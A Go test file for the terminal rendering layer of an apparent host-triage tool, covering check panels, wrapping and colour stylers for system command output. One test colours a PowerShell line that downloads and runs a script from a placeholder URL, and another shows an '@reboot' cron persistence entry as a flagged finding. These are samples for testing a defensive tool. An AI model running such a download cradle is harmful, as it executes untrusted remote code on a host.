@@ -1,0 +1,580 @@
+package render
+
+import (
+	"bytes"
+	"os"
+	"regexp"
+	"strings"
+	"testing"
+	"time"
+	"unicode/utf8"
+
+	"github.com/charmbracelet/lipgloss"
+	"github.com/muesli/termenv"
+
+	"karma/internal/model"
+)
+
+var ansi = regexp.MustCompile(`\x1b\[[0-9;]*m`)
+
+func plain(s string) string { return ansi.ReplaceAllString(s, "") }
+
+// The test process's stdout is not a terminal, so lipgloss lands in the Ascii
+// profile and comparing plain text would verify no coloring at all; pinning the
+// 256-color profile makes this package's color assertions real.
+func TestMain(m *testing.M) {
+	lipgloss.SetColorProfile(termenv.ANSI256)
+	os.Exit(m.Run())
+}
+
+// A check panel is a half-block left rail: the severity color for signals,
+// muted otherwise, the id left and metadata right on the first line, and
+// over-long lines soft-wrapped — not one word lost, continuation lines sharing
+// the body indent, the rail unbroken.
+func TestCheckPanelSignalRail(t *testing.T) {
+	const width = 48
+	long := strings.Repeat("allow from 203.0.113.0/24 ", 8)
+	result := &model.CheckResult{
+		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
+		Outcome: model.Collected,
+		Document: model.Document{
+			Filtered: []model.FilterCount{{ID: "drop", Count: 3}},
+			Sections: []model.Section{{Lines: []model.Line{
+				{
+					Text: "tcp 0.0.0.0:22", Severity: model.High,
+					Matches: []model.Match{{ID: "open", Severity: model.High, Message: "external listener", Start: 0, End: 3}},
+				},
+				{Text: long, Severity: model.Info},
+			}}},
+		},
+	}
+	got := checkPanel(result, 40, width)
+	lines := strings.Split(got, "\n")
+	if len(lines) < 3 {
+		t.Fatalf("panel too short: %q", plain(got))
+	}
+	head := plain(lines[0])
+	if !strings.HasPrefix(head, "▌ ") {
+		t.Fatalf("a signal panel should start with the half-block rail: %q", head)
+	}
+	if !strings.Contains(head, "listen") {
+		t.Fatalf("the first line should carry the check id: %q", head)
+	}
+	if !strings.Contains(head, "filtered 3") || strings.Index(head, "listen") > strings.Index(head, "filtered 3") {
+		t.Fatalf("metadata should be on the right: %q", head)
+	}
+	for i, line := range lines {
+		if !strings.HasPrefix(plain(line), "▌") {
+			t.Fatalf("line %d should carry the rail: %q", i, plain(line))
+		}
+		if got := lipgloss.Width(line); got > width-1 {
+			t.Fatalf("line %d is %d wide, past the right-edge slack: %q", i, got, plain(line))
+		}
+	}
+	if !strings.Contains(got, "⟨external listener⟩") {
+		t.Fatalf("a finding row should carry the trailing reason: %q", plain(got))
+	}
+	// Soft wrap preserves everything: every word of the long line is present,
+	// broken across several lines
+	body := plain(strings.Join(lines[2:], "\n"))
+	for _, word := range []string{"allow", "203.0.113.0/24"} {
+		if !strings.Contains(body, word) {
+			t.Fatalf("wrapping must not lose content (missing %q): %q", word, body)
+		}
+	}
+	if strings.Count(body, "203.0.113.0/24") != 8 {
+		t.Fatalf("all 8 addresses of the long line should survive: %q", body)
+	}
+	if len(lines)-2 < 4 {
+		t.Fatalf("an over-long line should wrap onto several lines, got %d: %q", len(lines)-2, body)
+	}
+}
+
+// Execution notes such as timeout/failure: with no body they still produce a
+// thin grey rail panel, with the red note on the right of the first line.
+func TestCheckPanelNoteBlock(t *testing.T) {
+	result := &model.CheckResult{
+		Check:   &model.Check{ID: "dmesg", Aspect: model.AspectKernel},
+		Outcome: model.Failed,
+		Note:    "timeout (30s), partial output kept",
+		Output:  "line one\nline two\n",
+	}
+	got := checkPanel(result, 400, 80)
+	if got == "" {
+		t.Fatal("a check with a note must not stay silent")
+	}
+	lines := strings.Split(got, "\n")
+	if !strings.HasPrefix(plain(lines[0]), "▌ dmesg") || !strings.Contains(plain(lines[0]), "timeout (30s), partial output kept") {
+		t.Fatalf("the first line should carry the id and the note: %q", plain(lines[0]))
+	}
+	if !strings.Contains(lines[0], highStyle.seq().Render("timeout (30s), partial output kept")) {
+		t.Fatalf("the note should be lit: %q", lines[0])
+	}
+	if body := plain(strings.Join(lines[1:], "\n")); !strings.Contains(body, "line one") ||
+		!strings.Contains(body, "line two") {
+		t.Fatalf("a note panel should carry the raw text: %q", body)
+	}
+}
+
+// A quiet check gets the grey rail; a check that was never collected and one
+// collected with no content alike do not appear in the report.
+func TestCheckPanelQuietRailAndSkippedLine(t *testing.T) {
+	quiet := &model.CheckResult{
+		Check:   &model.Check{ID: "passwd", Aspect: model.AspectIdentity},
+		Outcome: model.Collected,
+		Document: model.Document{Sections: []model.Section{
+			{Lines: []model.Line{{Text: "root:x:0:0:root:/root:/bin/bash", Severity: model.Info}}},
+		}},
+	}
+	lines := strings.Split(checkPanel(quiet, 40, 80), "\n")
+	quietRail := mutedStyle.seq().Render("▌")
+	for i, line := range lines {
+		if !strings.HasPrefix(plain(line), "▌ ") {
+			t.Fatalf("a quiet panel should start with the grey rail (line %d): %q", i, plain(line))
+		}
+		if !strings.HasPrefix(line, quietRail) {
+			t.Fatalf("the quiet panel's rail should be muted (line %d): %q", i, line)
+		}
+	}
+	if head := plain(lines[0]); !strings.HasPrefix(head, "▌ passwd") {
+		t.Fatalf("the first line should start with the id: %q", head)
+	}
+
+	skipped := &model.CheckResult{
+		Check:    &model.Check{ID: "last-log", Aspect: model.AspectIdentity},
+		Outcome:  model.Skipped,
+		Missing:  []string{"last"},
+		NotFound: []string{"lastlog"},
+	}
+	if got := checkPanel(skipped, 40, 80); got != "" {
+		t.Fatalf("a check that was never collected should stay silent: %q", plain(got))
+	}
+	empty := &model.CheckResult{
+		Check:    &model.Check{ID: "empty", Aspect: model.AspectIdentity},
+		Outcome:  model.Collected,
+		Document: model.Document{Sections: []model.Section{{}}},
+	}
+	if got := checkPanel(empty, 40, 80); got != "" {
+		t.Fatalf("a check collected with no content should stay silent: %q", plain(got))
+	}
+}
+
+// The aspect banner fills the line width, is all uppercase, white on dark, and
+// never exceeds the terminal.
+func TestAspectBanner(t *testing.T) {
+	const width = 60
+	band := aspectBanner("identity", width)
+	if got := lipgloss.Width(band); got != width-1 {
+		t.Fatalf("the banner should fill %d columns, got %d", width-1, got)
+	}
+	if text := plain(band); !strings.HasPrefix(text, " IDENTITY") {
+		t.Fatalf("the banner should be uppercase: %q", text)
+	}
+	if !strings.Contains(band, "\x1b[") {
+		t.Fatalf("the banner should be colored: %q", band)
+	}
+	if narrow := aspectBanner("identity", 12); lipgloss.Width(narrow) != 11 {
+		t.Fatalf("a narrow terminal should still be filled: %d", lipgloss.Width(narrow))
+	}
+}
+
+func TestTableAndKeyvalStylersStayInsideTheLine(t *testing.T) {
+	table := newTableStyler(nil, true)
+	lines := []string{
+		"USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT",
+		"root     pts/0    1.2.3.4          21:17    0.00s  0.01s  0.00s w",
+	}
+	if spans := table.style(lines[0]); spans != nil {
+		t.Fatalf("an all-caps header only records column anchors: %v", spans)
+	}
+	spans := table.style(lines[1])
+	if len(spans) == 0 {
+		t.Fatal("a data row should get column colors")
+	}
+	for _, span := range spans {
+		if span.Start < 0 || span.End > len(lines[1]) || span.Start >= span.End {
+			t.Fatalf("span out of range: %+v line length %d", span, len(lines[1]))
+		}
+	}
+
+	banner := "21:31:02 up 95 days, 12:16,  3 users,  load average: 1.33, 0.61, 0.28"
+	bannerSpans := table.style(banner)
+	if len(bannerSpans) != 1 || bannerSpans[0].Start != 0 || bannerSpans[0].End != len(banner) ||
+		bannerSpans[0].Style != mutedStyle {
+		t.Fatalf("w's uptime banner should be muted whole-line: %+v", bannerSpans)
+	}
+	short := " 10:20:30 up 12:16,  1 user,  load average: 0.00, 0.01, 0.05"
+	if got := table.style(short); len(got) != 1 || got[0].Style != mutedStyle {
+		t.Fatalf("an uptime banner under a day should also be muted whole-line: %+v", got)
+	}
+
+	route := newKeyvalStyler().style("default via 10.0.0.1 dev eth0 proto static")
+	if len(route) == 0 {
+		t.Fatal("a route row should get key/value colors")
+	}
+	for _, span := range route {
+		if span.End > len("default via 10.0.0.1 dev eth0 proto static") {
+			t.Fatalf("route span out of range: %+v", span)
+		}
+	}
+}
+
+func TestPaintLineOverlaysLaterSpans(t *testing.T) {
+	got := paintLine("0123456789", []Span{
+		{Start: 0, End: 10, Style: mutedStyle},
+		{Start: 2, End: 4, Style: highStyle},
+	})
+	if want := highStyle.seq().Render("23"); !strings.Contains(got, want) {
+		t.Fatalf("a later span should cover an earlier one: %q", plain(got))
+	}
+	if want := mutedStyle.seq().Render("01"); !strings.Contains(got, want) {
+		t.Fatalf("the leading part should keep the base color: %q", plain(got))
+	}
+	if want := mutedStyle.seq().Render("456789"); !strings.Contains(got, want) {
+		t.Fatalf("the trailing part should return to the base color: %q", plain(got))
+	}
+}
+
+func TestLsLPermissionBitsPaintedOverMutedBase(t *testing.T) {
+	line := "-rw-r--r-- 1 root root 4096 Jan 01 12:34 /tmp/notes.txt"
+	painted := paintLine(line, styleLsL(line))
+	wBit := style{fg: "3"}.seq().Render("w")
+	if !strings.Contains(painted, wBit) {
+		t.Fatalf("permission bits should be lit one by one (w yellow): %q", painted)
+	}
+	clock := style{fg: "2"}.seq().Render("Jan 01 12:34")
+	if !strings.Contains(painted, clock) {
+		t.Fatalf("a date with a time should be green: %q", painted)
+	}
+	owners := mutedStyle.seq().Render("-- 1 root root ")
+	if !strings.Contains(painted, owners) {
+		t.Fatalf("owner and group should be muted: %q", painted)
+	}
+}
+
+func TestLsmodKeepsUsedByTailPlain(t *testing.T) {
+	styler := newLineStyler("lsmod")
+	if spans := styler("Module                  Size  Used by"); spans != nil {
+		t.Fatalf("the header row should not be painted: %v", spans)
+	}
+	row := "nvidia_uvm            1310720  2 nvidia_core nvidia"
+	tail := strings.Index(row, "nvidia_core")
+	spans := styler(row)
+	if len(spans) == 0 {
+		t.Fatal("a data row should get column colors")
+	}
+	for _, span := range spans {
+		if span.End > tail {
+			t.Fatalf("the Used by tail (which may contain spaces) should stay default: %+v row %q", span, row)
+		}
+	}
+	for i, want := range []string{"nvidia_uvm", "1310720", "2"} {
+		if !strings.Contains(paintLine(row, spans), tableColumnStyles[i].seq().Render(want)) {
+			t.Fatalf("column %d should have its column color: %+v", i, spans)
+		}
+	}
+	legacy := "nvidia 53248 2 nvidia - Live 0xffffffffa0000000"
+	if tail := strings.Index(legacy, "Live"); tail > 0 {
+		for _, span := range styler(legacy) {
+			if span.End > tail {
+				t.Fatalf("the state field of /proc/modules should stay default: %+v", span)
+			}
+		}
+	}
+}
+
+func TestLineStylerPanicFallsBackToPlain(t *testing.T) {
+	boomer := safeLineStyler(func(string) []Span { panic("odd output") })
+	if spans := boomer("any line"); spans != nil {
+		t.Fatalf("a panic should return no spans: %v", spans)
+	}
+	if spans := boomer("next line"); spans != nil {
+		t.Fatalf("one blow-up should degrade to plain text permanently: %v", spans)
+	}
+}
+
+func TestPanelRenderPanicFallsBackToPlainBlock(t *testing.T) {
+	original := panelRenderer
+	defer func() { panelRenderer = original }()
+	panelRenderer = func(*model.CheckResult, int, int) string { panic("layout blew up") }
+	result := &model.CheckResult{
+		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
+		Outcome: model.Collected,
+		Output:  "tcp 0.0.0.0:22\n",
+	}
+	text, failed := renderPanel(result, 400, 100)
+	if !failed || text == "" {
+		t.Fatalf("a failed render should fall back to the grey block: failed=%v text=%q", failed, plain(text))
+	}
+	if !strings.Contains(plain(text), "listen") || !strings.Contains(plain(text), "tcp 0.0.0.0:22") {
+		t.Fatalf("the fallback block should keep the id and the raw text: %q", plain(text))
+	}
+}
+
+func TestProgressDoesNotStickToPanels(t *testing.T) {
+	var buf bytes.Buffer
+	check := &model.Check{ID: "listen", Aspect: model.AspectNetwork}
+	obs := NewLiveObserver(&buf, []*model.Check{check}, 40, 48, true)
+	obs.Start()
+	obs.CheckStarted(check)
+	time.Sleep(150 * time.Millisecond)
+	obs.CheckFinished(check, &model.CheckResult{
+		Check:   check,
+		Outcome: model.Collected,
+		Document: model.Document{Sections: []model.Section{{
+			Lines: []model.Line{{
+				Text: "tcp 0.0.0.0:22", Severity: model.High,
+				Matches: []model.Match{{
+					ID: "open", Severity: model.High, Message: "external listener", Start: 0, End: 3,
+				}},
+			}},
+		}}},
+	})
+	time.Sleep(150 * time.Millisecond)
+	obs.Close()
+
+	visible := strings.Join(screen(buf.String()), "\n")
+	if !strings.Contains(visible, "listen") || !strings.Contains(visible, "▌") {
+		t.Fatalf("the check panel should remain:\n%s", visible)
+	}
+	for _, line := range strings.Split(visible, "\n") {
+		if strings.Contains(line, "▌") && strings.Contains(line, "1/1") {
+			t.Fatalf("the progress count stuck to the rail: %q", line)
+		}
+		for _, frame := range spinnerFrames {
+			if strings.Contains(line, frame) {
+				t.Fatalf("a progress glyph stayed on screen: %q\n%s", line, visible)
+			}
+		}
+	}
+}
+
+// screen replays terminal semantics: \r returns to column 0, CSI K clears to
+// end of line, newline commits.
+func screen(raw string) []string {
+	var lines []string
+	var cur []rune
+	col := 0
+	for i := 0; i < len(raw); {
+		switch {
+		case raw[i] == '\n':
+			lines = append(lines, string(cur))
+			cur, col = nil, 0
+			i++
+		case raw[i] == '\r':
+			col = 0
+			i++
+		case strings.HasPrefix(raw[i:], "\033[K"):
+			if col < len(cur) {
+				cur = cur[:col]
+			}
+			i += len("\033[K")
+		case raw[i] == '\033':
+			i++
+			for i < len(raw) && (raw[i] < 0x40 || raw[i] > 0x7e) {
+				i++
+			}
+			if i < len(raw) {
+				i++
+			}
+		default:
+			r, size := utf8.DecodeRuneInString(raw[i:])
+			if col < len(cur) {
+				cur[col] = r
+			} else {
+				cur = append(cur, r)
+			}
+			col++
+			i += size
+		}
+	}
+	if len(cur) > 0 {
+		lines = append(lines, string(cur))
+	}
+	return lines
+}
+
+func TestSeverityBorderHue(t *testing.T) {
+	if severityBorder(model.Critical) != "1" || severityBorder(model.High) != "9" {
+		t.Fatalf("border hues: critical %q high %q", severityBorder(model.Critical), severityBorder(model.High))
+	}
+	if severityBorder(model.Medium) != "11" || severityBorder(model.Low) != "14" {
+		t.Fatalf("border hues: medium %q low %q", severityBorder(model.Medium), severityBorder(model.Low))
+	}
+}
+
+// Source titles are bold plain text (default color) and hits carry a trailing
+// reason; sources are separated by one blank line.
+func TestBodyRowsSourceBlocks(t *testing.T) {
+	result := &model.CheckResult{
+		Check:   &model.Check{ID: "cron", Aspect: model.AspectPersistence},
+		Outcome: model.Collected,
+		Document: model.Document{Sections: []model.Section{
+			{
+				Title:        "/etc/cron.d/evil",
+				TitleMatches: []model.Match{{ID: "cron-reboot", Severity: model.High, Message: "reboot trigger", Start: 5, End: 10}},
+				Lines: []model.Line{{
+					Text: "@reboot cmd", Severity: model.High,
+					Matches: []model.Match{{ID: "cron-reboot", Severity: model.High, Message: "reboot trigger", Start: 0, End: 7}},
+				}},
+			},
+			{
+				Title: "/etc/crontab",
+				Lines: []model.Line{{Text: "daily job", Severity: model.Info}},
+			},
+		}},
+	}
+	rows := bodyRows(result, 400, 100)
+	if got := plain(rows[0]); got != "/etc/cron.d/evil  ⟨reboot trigger⟩" {
+		t.Fatalf("the source title should come before the body, with the trailing reason: %q", got)
+	}
+	if !strings.Contains(rows[0], style{bold: true}.seq().Render("/etc/")) {
+		t.Fatalf("the source title should be bold plain text: %q", rows[0])
+	}
+	if strings.Contains(rows[0], mutedStyle.seq().Render("/etc/")) {
+		t.Fatalf("the source title should no longer be muted: %q", rows[0])
+	}
+	if got := plain(rows[1]); got != "@reboot cmd  ⟨reboot trigger⟩" {
+		t.Fatalf("below the source title comes the body row with its reason: %q", got)
+	}
+	if rows[2] != "" {
+		t.Fatalf("sources should be separated by one blank line: %q", plain(rows[2]))
+	}
+	if plain(rows[3]) != "/etc/crontab" {
+		t.Fatalf("a quiet source title is plain: %q", plain(rows[3]))
+	}
+}
+
+// The preamble (output before any source header) comes first, separated from
+// the source title by one blank line.
+func TestBodyRowsPreludeComesFirst(t *testing.T) {
+	result := &model.CheckResult{
+		Check:   &model.Check{ID: "mixed", Aspect: model.AspectIdentity},
+		Outcome: model.Collected,
+		Document: model.Document{Sections: []model.Section{
+			{Lines: []model.Line{{Text: "raw prelude", Severity: model.Info}}},
+			{Title: "/etc/passwd", Lines: []model.Line{{Text: "root:x:0:0:", Severity: model.Info}}},
+		}},
+	}
+	rows := bodyRows(result, 400, 100)
+	if plain(rows[0]) != "raw prelude" {
+		t.Fatalf("the preamble should come first: %q", plain(rows[0]))
+	}
+	if rows[1] != "" || plain(rows[2]) != "/etc/passwd" {
+		t.Fatalf("the preamble and the source should be separated by one blank line: %q", plain(strings.Join(rows, "|")))
+	}
+}
+
+// On a real Windows host (Server 2025, 146 columns) a title row carrying a CJK
+// badge once showed a shifted border and a collapsed line width; the line-width
+// invariant is now folded into TestCheckPanelSignalRail's per-line assertions.
+
+// A failed render falls back to a thin grey rail with the raw text, keeping the
+// id and the text.
+func TestFallbackPanelKeepsRawText(t *testing.T) {
+	result := &model.CheckResult{
+		Check:   &model.Check{ID: "listen", Aspect: model.AspectNetwork},
+		Outcome: model.Collected,
+		Output:  "tcp 0.0.0.0:22\n",
+	}
+	text := fallbackPanel(result, 400, 100)
+	for _, line := range strings.Split(text, "\n") {
+		if !strings.HasPrefix(plain(line), "▌") {
+			t.Fatalf("the fallback block should be a grey rail: %q", plain(line))
+		}
+	}
+	if joined := plain(text); !strings.Contains(joined, "listen") || !strings.Contains(joined, "tcp 0.0.0.0:22") {
+		t.Fatalf("the fallback block should keep the id and the raw text: %q", joined)
+	}
+}
+
+func TestRegStyler(t *testing.T) {
+	styler := newLineStyler("reg")
+	key := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`
+	if spans := styler(key); len(spans) != 1 || spans[0].Start != 0 || spans[0].End != len(key) {
+		t.Fatalf("the key path should be painted whole-line: %+v", spans)
+	}
+	row := `    url1    REG_SZ    \\Mac\Home\Docs`
+	spans := styler(row)
+	for _, want := range []struct {
+		text   string
+		Styler style
+	}{
+		{"url1", style{fg: "4"}},
+		{"REG_SZ", keywordColor},
+	} {
+		if !strings.Contains(paintLine(row, spans), want.Styler.seq().Render(want.text)) {
+			t.Fatalf("the value row should light up %q: %q", want.text, plain(paintLine(row, spans)))
+		}
+	}
+	hexRow := `    0    REG_BINARY    0C,00,00,00`
+	if spans := styler(hexRow); !strings.Contains(paintLine(hexRow, spans), dimStyle.seq().Render("0C,00,00,00")) {
+		t.Fatalf("hex data should be dimmed: %q", plain(paintLine(hexRow, styler(hexRow))))
+	}
+	cont := `        00,00,00,00`
+	if spans := styler(cont); len(spans) != 1 || spans[0].Style != dimStyle {
+		t.Fatalf("a wrapped continuation should be dimmed whole-line: %+v", spans)
+	}
+}
+
+func TestUSBStyler(t *testing.T) {
+	styler := newLineStyler("pipe")
+	row := `win2k25-0 SSD | 3&4b87e29&0&000000 | Installed 2025-01-02 03:04:05 | Last Connected 2025-06-07 08:09:10`
+	spans := styler(row)
+	if len(spans) == 0 {
+		t.Fatal("a usb row should be painted")
+	}
+	painted := paintLine(row, spans)
+	if !strings.Contains(painted, style{fg: "4"}.seq().Render("win2k25-0 SSD")) {
+		t.Fatalf("the device name should be blue: %q", plain(painted))
+	}
+	if !strings.Contains(painted, style{fg: "2"}.seq().Render("2025-01-02 03:04:05")) {
+		t.Fatalf("a timestamp should be green: %q", plain(painted))
+	}
+	if !strings.Contains(painted, mutedStyle.seq().Render("Last Connected")) {
+		t.Fatalf("a label should be muted: %q", plain(painted))
+	}
+	bare := `MacBook Pro Camera | 6&3b8d32a8&0&0000`
+	if spans := styler(bare); len(spans) == 0 {
+		t.Fatal("a row without a timestamp should also be painted")
+	}
+}
+
+func TestNetstatStyler(t *testing.T) {
+	styler := newLineStyler("netstat")
+	header := `  Proto  Local Address          Foreign Address        State           PID`
+	if spans := styler(header); spans != nil {
+		t.Fatalf("a header row only records column anchors: %v", spans)
+	}
+	row := `  TCP    10.0.0.5:52134         1.2.3.4:443           ESTABLISHED     4321`
+	spans := styler(row)
+	if len(spans) == 0 {
+		t.Fatal("a data row should get column colors")
+	}
+	for _, span := range spans {
+		if span.Start < 0 || span.End > len(row) || span.Start >= span.End {
+			t.Fatalf("span out of range: %+v line length %d", span, len(row))
+		}
+	}
+}
+
+func TestPowershellStyler(t *testing.T) {
+	styler := newLineStyler("powershell")
+	line := `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/y.ps1')`
+	spans := styler(line)
+	if len(spans) == 0 {
+		t.Fatal("a PowerShell command line should be painted")
+	}
+	painted := paintLine(line, spans)
+	if !strings.Contains(painted, keywordColor.seq().Render("Invoke-Expression")) {
+		t.Fatalf("a cmdlet should get the keyword color: %q", plain(painted))
+	}
+	if !strings.Contains(painted, stringColor.seq().Render(`'http://x/y.ps1'`)) {
+		t.Fatalf("a URL string should be blue: %q", plain(painted))
+	}
+	for _, span := range spans {
+		if span.Start < 0 || span.End > len(line) || span.Start >= span.End {
+			t.Fatalf("span out of range: %+v line length %d", span, len(line))
+		}
+	}
+}
